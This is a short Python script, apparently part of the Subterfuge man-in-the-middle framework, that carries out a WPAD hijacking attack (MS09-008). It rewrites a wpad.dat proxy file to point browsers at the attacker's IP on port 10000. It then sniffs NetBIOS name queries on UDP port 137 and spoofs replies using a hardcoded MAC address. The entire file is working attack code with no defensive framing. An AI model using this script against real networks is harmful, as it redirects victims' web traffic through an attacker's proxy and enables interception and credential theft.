#!/usr/bin/python
#################
#This file executes a WPAD Hijacking attack (MS09_008)
#################
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import os
import re
import sys
import threading
sys.path.append('/usr/share/subterfuge')
sys.path.append('/usr/share/subterfuge/utilities')
   #Import Subterfuge Dependencies
from subutils import globalvars
from nbtools import *


globalvar = globalvars()


print "Building/Serving: wpad.dat"
with open('/usr/share/subterfuge/templates/wpad.dat', 'r') as file:
   conf = file.readlines()
conf[2] = 'return "PROXY ' + globalvar['attackerip'] + ':10000";\n'
with open('/usr/share/subterfuge/templates/wpad.dat', 'w') as file:
   file.writelines(conf)

print "Listening for Netbios Name Queries..."
while 1:
   data = sniff(filter="udp and port 137", count=1)
   nbQueryCheck(data[0], globalvar['attackerip'], 'f0:7b:cb:4d:d6:6f')